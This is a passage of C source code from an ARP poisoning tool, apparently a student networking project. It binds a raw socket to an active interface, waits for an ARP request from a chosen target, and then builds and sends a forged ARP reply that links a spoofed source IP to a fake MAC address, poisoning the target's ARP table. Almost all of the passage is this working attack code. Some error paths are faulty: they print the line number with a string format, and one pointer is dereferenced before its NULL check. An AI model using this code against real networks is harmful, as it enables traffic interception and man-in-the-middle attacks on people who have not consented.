        * Return failure to indicate the function to get the value of the target ip from the argument failed
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when function to get the value of the target ip from the argument succeeded
        */
        }

    /**
    * Getting the value of the target mac from the argument
    */
    u8_lcl_return_from_function = RETURN_FAILURE;
    u8_lcl_return_from_function = Fu8__get_mac_from_string(ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_, ptr_cstc_pssd_malcolm_data->sstc_program_argument_.dbl_ptr_u8_ip_or_mac_address_str_[3]);

    /**
    * Check if function to get the value of the target mac from the argument succeeded
    */
    if(u8_lcl_return_from_function != RETURN_SUCCESS)
        {
        /**
        * Treat the case when the function to get the value of the target mac from the argument failed
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to get the value of the target mac from the argument failed\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the function to get the value of the target mac from the argument failed
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when function to get the value of the target mac from the argument succeeded
        */
        }

    return (RETURN_SUCCESS);
    }

uint8_t Fu8__forge_arp_respond(struct ether_arp *ptr_estc_pssd_ether_arp, struct ether_header *ptr_estc_pssd_ether_header, struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_data)
    {
    /**
    * Assertion of argument
    */

    /**
    * Check if the address to the ether arp header packet part is correctly pointing passed as an argument of the function
    */
    if(ptr_estc_pssd_ether_arp == NULL)
        {
        /**
        * Treat the case when the address to the ether arp header packet part is not correctly pointing passed as an argument of the function
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the address to the ether arp header packet part is not correctly pointing passed as an argument of the function\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the address to the ether arp header packet part is not correctly pointing passed as an argument of the function
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the address to the ether arp header packet part is correctly pointing passed as an argument of the function
        */
        } 

    /**
    * Check if the address to the ether header packet part is correctly pointing passed as an argument of the function
    */
    if(ptr_estc_pssd_ether_header == NULL)
        {
        /**
        * Treat the case when the address to the ether header packet part is not correctly pointing passed as an argument of the function
        */

    #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the address to the ether header packet part is not correctly pointing passed as an argument of the function\n", __FILE__, __func__, __LINE__);
    #endif

    #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
    #endif

    #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
    #endif

        /**
        * Return failure to indicate the address to the ether header packet part is not correctly pointing passed as an argument of the function
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the address to the ether header packet part is correctly pointing passed as an argument of the function
        */
        } 

    /**
    * Check if the structure malcolm data is correctly pointing passed as an argument of the function
    */
    if(ptr_cstc_pssd_malcolm_data == NULL)
        {
        /**
        * Treat the case when the structure malcolm data is not correctly pointing passed as an argument of the function
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is not correctly pointing passed as an argument of the function\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the structure malcolm data is not correctly pointing passed as an argument of the function
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the structure malcolm data is correctly pointing passed as an argument of the function
        */
        }

    /**
    * Check if the structure malcolm data is not initialized
    */
    if((ptr_cstc_pssd_malcolm_data->u8_global_status_ & FIRST_BIT) == FALSE)
        {
        /**
        * Treat the case when the structure malcolm data is not initialized
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is not initialized\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the structure malcolm data is not initialized
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the structure malcolm data is initialized as expected
        */
        }

    /**
    * Setting the mac address of the local interface network to the source mac address of the ether header in packet
    */
    (void) ft_memcpy(ptr_estc_pssd_ether_header->ether_shost, ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_, MAC_ADDRESS_BYTE_LEN);

    /**
    * Setting the target mac address to the ether header destination mac address
    */
    (void) ft_memcpy(ptr_estc_pssd_ether_header->ether_dhost, ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_, MAC_ADDRESS_BYTE_LEN);

    /**
    * Set the type of the arp packet to reply
    */
    ptr_estc_pssd_ether_arp->ea_hdr.ar_op = htons(ARPOP_REPLY);

    /**
    * Setting the fake source mac address with the source address to the arp packet
    */
    (void) ft_memcpy(ptr_estc_pssd_ether_arp->arp_sha, ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_, MAC_ADDRESS_BYTE_LEN);
    (*((uint32_t *) ptr_estc_pssd_ether_arp->arp_spa)) = *((uint32_t *) ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_);

    /**
    * Setting the target mac address with the target address to the arp packet
    */
    (void) ft_memcpy(ptr_estc_pssd_ether_arp->arp_tha, ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_, MAC_ADDRESS_BYTE_LEN);
    (*((uint32_t *) ptr_estc_pssd_ether_arp->arp_tpa)) = (*(uint32_t *) ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_);

    return (RETURN_SUCCESS);
    }

uint8_t Fu8__get_valid_interface(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_data)
    {
    /**
    * Assertion of argument
    */

    /**
    * Check if the structure malcolm data is correctly pointing passed as an argument of the function
    */
    if(ptr_cstc_pssd_malcolm_data == NULL)
        {
        /**
        * Treat the case when the structure malcolm data is not correctly pointing passed as an argument of the function
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is not correctly pointing passed as an argument of the function\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the structure malcolm data is not correctly pointing passed as an argument of the function
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the structure malcolm data is correctly pointing passed as an argument of the function
        */
        }

    /**
    * Check if the structure malcolm data is not initialized
    */
    if((ptr_cstc_pssd_malcolm_data->u8_global_status_ & FIRST_BIT) == FALSE)
        {
        /**
        * Treat the case when the structure malcolm data is not initialized
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is not initialized\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the structure malcolm data is not initialized
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the structure malcolm data is initialized as expected
        */
        }

    /**
    * Check if the socket in the structure malcolm data is not valid
    */
    if(ptr_cstc_pssd_malcolm_data->s32_socket_ < 0)
        {
        /**
        * Treat the case when the socket in the structure malcolm data is not valid
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the socket in the structure malcolm data is not valid\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the socket in the structure malcolm data is not valid
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the socket in the structure malcolm data is valid
        */
        } 


    /**
    * Creation of local variable
    */
    struct ifreq    estc_lcl_ifr;
    int32_t         s32_lcl_return_from_function;
    struct ifaddrs *ptr_estc_lcl_actual_network_interfaces;
    struct ifaddrs *ptr_estc_lcl_network_interfaces;

    /**
    * Initialization of local variable
    */
    ptr_estc_lcl_actual_network_interfaces = NULL;
    ptr_estc_lcl_network_interfaces        = NULL;
    s32_lcl_return_from_function           = -1;

    ft_memset(&estc_lcl_ifr, 0, sizeof(estc_lcl_ifr));

    /**
    * Getting all the network interface of the local system
    */
    s32_lcl_return_from_function = -1;
    s32_lcl_return_from_function = getifaddrs(&ptr_estc_lcl_network_interfaces);

    /**
    * Check if function to get all the network interface of the local system succeeded
    */
    if(s32_lcl_return_from_function < 0)
        {
        /**
        * Treat the case when the function to get all the network interface of the local system failed
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to get all the network interface of the local system  failed\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the function to get all the network interface of the local system failed
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when function to get all the network interface of the local system succeeded
        */
        }

    ptr_estc_lcl_actual_network_interfaces = ptr_estc_lcl_network_interfaces;
    while(ptr_estc_lcl_actual_network_interfaces != NULL)
        {
        if((ptr_estc_lcl_actual_network_interfaces->ifa_addr->sa_family == AF_PACKET) && (ptr_estc_lcl_actual_network_interfaces->ifa_name != NULL) && (ptr_estc_lcl_actual_network_interfaces->ifa_addr != NULL) && ((ptr_estc_lcl_actual_network_interfaces->ifa_flags & IFF_UP) != FALSE) && ((ptr_estc_lcl_actual_network_interfaces->ifa_flags & IFF_BROADCAST) != FALSE) && ((ptr_estc_lcl_actual_network_interfaces->ifa_flags & IFF_RUNNING) != FALSE))
            {
            ft_printf("Found available interface: %s\n", ptr_estc_lcl_actual_network_interfaces->ifa_name);

            /**
            * Getting the name of the actual local Network interface
            */
            (void) ft_strncpy((char *) ptr_cstc_pssd_malcolm_data->u8_interface_name_str_, ptr_estc_lcl_actual_network_interfaces->ifa_name, MAX_INTERFACE_NAME_LEN);
            ptr_cstc_pssd_malcolm_data->u8_interface_name_str_[MAX_INTERFACE_NAME_LEN - 1] = NIL;

            /**
            * Getting the mac address of the actual local Network interface
            */
            (void) ft_memcpy(ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_, (uint8_t *)(((struct sockaddr_ll *) ptr_estc_lcl_actual_network_interfaces->ifa_addr)->sll_addr), MAC_ADDRESS_BYTE_LEN);

            (void) ft_strcpy(estc_lcl_ifr.ifr_name, ptr_estc_lcl_actual_network_interfaces->ifa_name);

            /**
            * Setting the socket to the found available interface
            */
            s32_lcl_return_from_function = -1;
            s32_lcl_return_from_function = setsockopt(ptr_cstc_pssd_malcolm_data->s32_socket_, SOL_SOCKET, SO_BINDTODEVICE, (void *) &estc_lcl_ifr, sizeof(estc_lcl_ifr));

            /**
            * Check if function to set the socket to the found available interface succeeded
            */
            if(s32_lcl_return_from_function < 0)
                {
                /**
                * Treat the case when the function to set the socket to the found available interface failed
                */

                #ifdef DEVELOPEMENT
                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to set the socket to the found available interface  failed\n", __FILE__, __func__, __LINE__);
                #endif

                #ifdef DEMO
                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
                #endif

                #ifdef PRODUCTION
                fprintf(stderr, "\033[1;31mERROR\033[0m\n");
                #endif

                /**
                * Freeing the linked list of network interface of the local system
                */
                (void) freeifaddrs(ptr_estc_lcl_network_interfaces);

                /**
                * Return failure to indicate the function to set the socket to the found available interface failed
                */
                return (RETURN_FAILURE);
                }
            else
                {
                /**
                * Treat the case when function to set the socket to the found available interface succeeded
                */
                } 

            /**
            * Freeing the linked list of network interface of the local system
            */
            (void) freeifaddrs(ptr_estc_lcl_network_interfaces);

            return (RETURN_SUCCESS);
            }

        ptr_estc_lcl_actual_network_interfaces = ptr_estc_lcl_actual_network_interfaces->ifa_next;
        }

    /**
    * Freeing the linked list of network interface of the local system
    */
    (void) freeifaddrs(ptr_estc_lcl_network_interfaces);

    /**
    * Treat the case when no available interface found
    */

    #ifdef DEVELOPEMENT
    fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    no available interface found\n", __FILE__, __func__, __LINE__);
    #endif

    #ifdef DEMO
    fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
    #endif

    #ifdef PRODUCTION
    fprintf(stderr, "\033[1;31mERROR\033[0m\n");
    #endif

    /**
    * Return failure to indicate no available interface found
    */
    return (RETURN_FAILURE);
    }

uint8_t Fu8__make_arp_poisoning(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_data)
    {
    /**
    * Assertion of argument
    */

    /**
    * Check if the structure malcolm data is correctly pointing passed as an argument of the function
    */
    if(ptr_cstc_pssd_malcolm_data == NULL)
        {
        /**
        * Treat the case when the structure malcolm data is not correctly pointing passed as an argument of the function
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is not correctly pointing passed as an argument of the function\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the structure malcolm data is not correctly pointing passed as an argument of the function
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the structure malcolm data is correctly pointing passed as an argument of the function
        */
        }

    /**
    * Check if the structure malcolm data is not initialized
    */
    if((ptr_cstc_pssd_malcolm_data->u8_global_status_ & FIRST_BIT) == FALSE)
        {
        /**
        * Treat the case when the structure malcolm data is not initialized
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is not initialized\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the structure malcolm data is not initialized
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the structure malcolm data is initialized as expected
        */
        }

    /**
    * Check if the structure program argument in the structure malcolm data passed in argument of the function is not initialized
    */
    if((ptr_cstc_pssd_malcolm_data->sstc_program_argument_.u8_global_status_ & FIRST_BIT) == FALSE)
        {
        /**
        * Treat the case when the structure program argument in the structure malcolm data passed in argument of the function is not initialized
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure program argument in the structure malcolm data passed in argument of the function is not initialized\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the structure program argument in the structure malcolm data passed in argument of the function is not initialized
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the structure program argument in the structure malcolm data passed in argument of the function is initialized
        */
        }

    /**
    * Creation of local variable
    */
    int32_t              s32_lcl_return_from_function;
    socklen_t            estc_lcl_length_of_socket_addr;
    ssize_t              sszt_lcl_number_of_byte;
    struct ether_arp    *ptr_estc_lcl_ether_arp;
    struct ether_header *ptr_estc_lcl_ether_header;
    struct sockaddr_ll   estc_lcl_socket_addr;
    uint8_t              u8_lcl_packet[PACKET_MAX_LEN];
    uint8_t              u8_lcl_return_from_function;

    /**
    * Initialization of local variable
    */
    estc_lcl_length_of_socket_addr = sizeof(estc_lcl_socket_addr);
    ptr_estc_lcl_ether_arp         = NULL;
    ptr_estc_lcl_ether_header      = NULL;
    s32_lcl_return_from_function   = -1;
    sszt_lcl_number_of_byte        = 0;
    u8_lcl_return_from_function    = RETURN_FAILURE;

    /**
    * Initialize the packet value to zero
    */
    (void) ft_bzero(u8_lcl_packet, PACKET_MAX_LEN);

    /**
    * Initialize the local structure to zero
    */
    (void) ft_bzero(&estc_lcl_socket_addr, sizeof(estc_lcl_socket_addr));

    /**
    * Getting a valid interface
    */
    u8_lcl_return_from_function = RETURN_FAILURE;
    u8_lcl_return_from_function = Fu8__get_valid_interface(ptr_cstc_pssd_malcolm_data);

    /**
    * Check if function to get a valid interface succeeded
    */
    if(u8_lcl_return_from_function != RETURN_SUCCESS)
        {
        /**
        * Treat the case when the function to get a valid interface failed
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to get a valid interface  failed\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the function to get a valid interface failed
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when function to get a valid interface succeeded
        */
        }

    ft_printf("Waiting for ARP request ...\n\n");

    /**
    * Waiting for an arp request packet from the source ip to the target ip
    */
    while(1)
        {
        /**
        * Receving a packet from the socket in the structure malcolm data
        */
        sszt_lcl_number_of_byte = -1;
        sszt_lcl_number_of_byte = recvfrom(ptr_cstc_pssd_malcolm_data->s32_socket_, u8_lcl_packet, PACKET_MAX_LEN, 0, (struct sockaddr *) &estc_lcl_socket_addr, &estc_lcl_length_of_socket_addr);

        /**
        * Check if function to receve a packet from the socket in the structure malcolm data succeeded
        */
        if(sszt_lcl_number_of_byte < 0)
            {
            /**
            * Treat the case when the function to receve a packet from the socket in the structure malcolm data failed
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to receve a packet from the socket in the structure malcolm data failed\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return failure to indicate the function to receve a packet from the socket in the structure malcolm data failed
            */
            return (RETURN_FAILURE);
            }
        else
            {
            /**
            * Treat the case when function to receve a packet from the socket in the structure malcolm data succeeded
            */
            }

        /**
        * Check if the socket in the structure malcolm data is orderly shutdown
        */
        if(sszt_lcl_number_of_byte == 0)
            {
            /**
            * Treat the case when the socket in the structure malcolm data is orderly shutdown
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the socket in the structure malcolm data is orderly shutdown\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Check if the socket is valid
            */
            if(ptr_cstc_pssd_malcolm_data->s32_socket_ > 2)
                {
                /**
                * Treat the case when the socket is valid
                */

                /**
                * Closing the socket
                */
                s32_lcl_return_from_function = RETURN_FAILURE;
                s32_lcl_return_from_function = close(ptr_cstc_pssd_malcolm_data->s32_socket_);

                /**
                * Check if function to close the socket succeeded
                */
                if(s32_lcl_return_from_function < 0)
                    {
                    /**
                    * Treat the case when the function to close the socket failed
                    */

                    #ifdef DEVELOPEMENT
                    fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to close the socket failed\n", __FILE__, __func__, __LINE__);
                    #endif

                    #ifdef DEMO
                    fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
                    #endif

                    #ifdef PRODUCTION
                    fprintf(stderr, "\033[1;31mERROR\033[0m\n");
                    #endif

                    /**
                    * Return failure to indicate the function to close the socket failed
                    */
                    return (RETURN_FAILURE);
                    }
                else
                    {
                    /**
                    * Treat the case when function to close the socket succeeded
                    */

                    ptr_cstc_pssd_malcolm_data->s32_socket_ = -1;
                    }
                }
            else
                {
                /**
                * Treat the case when the socket is not valid
                */

                ptr_cstc_pssd_malcolm_data->s32_socket_ = -1;
                }

            /**
            * Return failure to indicate the socket in the structure malcolm data is orderly shutdown
            */
            return (RETURN_FAILURE);
            }
        else
            {
            /**
            * Treat the case when the socket in the structure malcolm data is not orderly shutdown
            */
            }

        /**
        * Check if the packet receve is bigger or equals than an ARP packet
        */
        if((size_t) sszt_lcl_number_of_byte >= (sizeof(struct ether_header) + sizeof(struct ether_arp)))
            {
            /**
            * Treat the case when the packet receve is bigger or equals than an ARP packet
            */

            ptr_estc_lcl_ether_header = (struct ether_header *) u8_lcl_packet;
            ptr_estc_lcl_ether_arp    = (struct ether_arp *) (u8_lcl_packet + sizeof(struct ether_header));

            if(ntohs(ptr_estc_lcl_ether_header->ether_type) == ETH_P_ARP)
                printf("ARP %s from %d.%d.%d.%d for %d.%d.%d.%d\n", (ntohs(ptr_estc_lcl_ether_arp->ea_hdr.ar_op) == ARPOP_REQUEST) ? "REQUEST" : "RESPOND", ((uint8_t *)ptr_estc_lcl_ether_arp->arp_spa)[0], ((uint8_t *)ptr_estc_lcl_ether_arp->arp_spa)[1], ((uint8_t *)ptr_estc_lcl_ether_arp->arp_spa)[2], ((uint8_t *)ptr_estc_lcl_ether_arp->arp_spa)[3], ((uint8_t *)ptr_estc_lcl_ether_arp->arp_tpa)[0], ((uint8_t *)ptr_estc_lcl_ether_arp->arp_tpa)[1], ((uint8_t *)ptr_estc_lcl_ether_arp->arp_tpa)[2], ((uint8_t *)ptr_estc_lcl_ether_arp->arp_tpa)[3]);
            /**
            * Check if the actual packet receve is an arp request packet from the source ip passed in the first argument of the program to the target ip passed in the third argument of the program
            */
            if((ntohs(ptr_estc_lcl_ether_header->ether_type) == ETH_P_ARP) && (ntohs(ptr_estc_lcl_ether_arp->ea_hdr.ar_op) == ARPOP_REQUEST) && *((uint32_t *) ptr_estc_lcl_ether_arp->arp_spa) == *((uint32_t *) ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_) && *((uint32_t *) ptr_estc_lcl_ether_arp->arp_tpa) == *((uint32_t *) ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_))
                {
                /**
                * Treat the case when the actual packet receve is an arp request packet from the source ip passed in the first argument of the program to the target ip passed in the third argument of the program
                */

                /**
                * Stop waiting for an arp request packet from the source ip to the target ip
                */
                break;
                }
            else
                {
                /**
                * Treat the case when the actual packet receve is not an arp request packet or not from the source ip passed in the first argument of the program or not to the target ip passed in the third argument of the program
                */
                }
            }
        else
            {
            /**
            * Treat the case when the packet receve is smaller than an ARP packet
            */
            }
        }

    ft_printf("Receve an ARP request from %u.%u.%u.%u to %u.%u.%u.%u\n", ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[0], ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[1], ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[2], ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[3], ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[0], ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[1], ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[2], ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[3]);

    /**
    * Forge an ARP respond packet
    */
    u8_lcl_return_from_function = RETURN_FAILURE;
    u8_lcl_return_from_function = Fu8__forge_arp_respond(ptr_estc_lcl_ether_arp, ptr_estc_lcl_ether_header, ptr_cstc_pssd_malcolm_data);

    /**
    * Check if function to Forge an ARP respond packet succeeded
    */
    if(u8_lcl_return_from_function != RETURN_SUCCESS)
        {
        /**
        * Treat the case when the function to Forge an ARP respond packet failed
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to Forge an ARP respond packet  failed\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the function to Forge an ARP respond packet failed
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when function to Forge an ARP respond packet succeeded
        */
        } 

    ft_printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");

    /**
    * Sending the forged arp reply
    */
    sszt_lcl_number_of_byte = RETURN_FAILURE;
    sszt_lcl_number_of_byte = sendto(ptr_cstc_pssd_malcolm_data->s32_socket_, u8_lcl_packet, sizeof(struct ether_header) + sizeof(struct ether_arp), 0, (struct sockaddr *) &estc_lcl_socket_addr, sizeof(struct sockaddr_ll));

    /**
    * Check if function to send the forged arp reply succeeded
    */
    if(sszt_lcl_number_of_byte < 0)
        {
        /**
        * Treat the case when the function to send the forged arp reply failed
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to send the forged arp reply  failed\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the function to send the forged arp reply failed
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when function to send the forged arp reply succeeded
        */
        }

    ft_printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");

    return (RETURN_SUCCESS);
    }

int main(int32_t s32_pssd_program_argument_number, char **dbl_ptr_s8_pssd_program_arguments)
    {
    /**
    * Creation of local variable
    */
    struct cstc_malcolm_data cstc_lcl_malcolm_data;
